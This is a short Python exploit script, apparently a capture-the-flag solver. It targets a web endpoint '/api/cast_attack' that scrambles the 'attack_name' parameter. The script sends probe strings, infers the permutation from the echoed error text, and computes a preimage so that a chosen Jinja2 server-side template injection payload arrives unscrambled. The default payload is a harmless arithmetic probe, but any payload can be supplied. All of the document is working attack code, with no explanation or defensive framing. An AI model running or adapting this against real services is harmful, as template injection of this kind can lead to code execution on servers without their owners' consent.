import re, math, argparse, requests

def shuffled_of(api, probe: str) -> str:
    r = requests.get(api, params={"attack_name": probe})
    j = r.json()
    m = re.search(r"No magic name (.+?) here", j.get("error",""))
    if not m:
        raise RuntimeError(j.get("error", j))
    return m.group(1)

ALPH = "_0123456789"

def build_probe(n: int, k: int) -> str:
    arr = [ALPH[(i // (10**k)) % 10 + 1] for i in range(n)]
    if n > 0:
        arr[0] = "_"
    return ''.join(arr)

def infer_perm(api, n: int):
    if n <= 1:
        return list(range(n))
    m = math.ceil(math.log10(n))
    probes = [build_probe(n, k) for k in range(m)]
    outs = [shuffled_of(api, p) for p in probes]
    perm = [None]*n
    for newpos in range(n):
        i, zero = 0, True
        for k in range(m):
            ch = outs[k][newpos]
            if ch != "_":
                zero = False
                digit = ALPH.index(ch) - 1
                i += digit * (10**k)
        if zero:
            i = 0
        if i >= n:
            i %= n
        perm[i] = newpos
    if any(v is None for v in perm):
        raise RuntimeError("perm inference failed")
    return perm

def preimage(api, target: str) -> str:
    perm = infer_perm(api, len(target))
    return ''.join(target[j] for j in perm)

def send(api, target: str):
    s = preimage(api, target)
    r = requests.get(api, params={"attack_name": s})
    return s, r.json().get("error","")

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:1111", help="http://host:port")
    ap.add_argument("--expr", default="{{70-21}}", help="Jinja2 payload đích")
    ap.add_argument("--dry", action="store_true", help="Chỉ in preimage, không gửi")
    args = ap.parse_args()

    API = f"{args.base.rstrip('/')}/api/cast_attack"
    s = preimage(API, args.expr)
    if args.dry:
        print(s)
    else:
        print("preimage:", s)
        print(requests.get(API, params={"attack_name": s}).json().get("error",""))